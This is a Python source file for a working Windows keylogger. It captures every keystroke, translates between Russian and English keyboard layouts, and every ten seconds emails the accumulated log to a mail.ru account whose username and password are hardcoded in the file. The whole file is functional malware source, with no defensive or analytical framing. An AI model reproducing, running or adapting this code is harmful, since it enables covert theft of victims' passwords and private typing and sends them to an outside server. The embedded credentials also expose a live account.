import os
import keyboard
import smtplib
import ctypes
from datetime import datetime
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

interval = 10
password = "8Deg4tEm0pzF21dstxNr"
username = "shro_experiment@mail.ru"

en = "qwertyuiop[]asdfghjkl;'zxcvbnm,."
ru = "йцукенгшщзхъфывапролджэячсмитьбю"
enru = {}
ruen = {}
for i in range(32):
    enru[en[i]] = ru[i]
    ruen[ru[i]] = en[i]

u = ctypes.windll.LoadLibrary("user32.dll")
pf = getattr(u, "GetKeyboardLayout")
if pf(0) == 68748313:
    layout = 'ru'
else:
    layout = 'en'


def change_layout():
    global layout
    if layout == "en":
        layout = "ru"
    else:
        layout = "en"


class Keylogger:

    def __init__(self, interval):
        self.interval = interval    # отчет каждые N секунд
        self.log = ""               # строка для лога
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def check_layout(self):
        if self.log[-12:] == "[shift][alt]" or self.log[-12:] == "[alt][shift]":
            change_layout()

    def callback(self, event):
        name = event.name
        self.check_layout()
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[enter]\n"
            elif name == "decimal":
                name = "."
            elif name == "alt gr":
                name = ""
            else:
                name = f"[{name}]"
            self.log += name
        elif len(name) == 1:
            if (layout == 'en' and name in list(enru.keys())) or (layout == 'ru' and name in list(ruen.keys())):
                self.log += name
            elif layout == 'ru' and name in list(enru.keys()):
                self.log += enru[name]
            elif layout == 'en' and name in list(ruen.keys()):
                self.log += ruen[name]

    def form_message(self, email, message):
        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = email
        msg["Subject"] = "keylogger report"
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-")
        message += '\n\n' + start_dt_str + "_" + end_dt_str
        msg.attach(MIMEText(message, 'plain'))
        return msg

    def sendmail(self, email, password, message):
        msg = self.form_message(email, message)
        server = smtplib.SMTP_SSL('smtp.mail.ru: 465')
        server.login(msg["From"], password)
        server.sendmail(msg["From"], msg["To"], msg.as_string())
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.sendmail(username, password, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


keyboard.add_hotkey("ctrl+alt", lambda: os._exit(0))

if __name__ == "__main__":
    keylogger = Keylogger(interval=interval)
    keylogger.start()

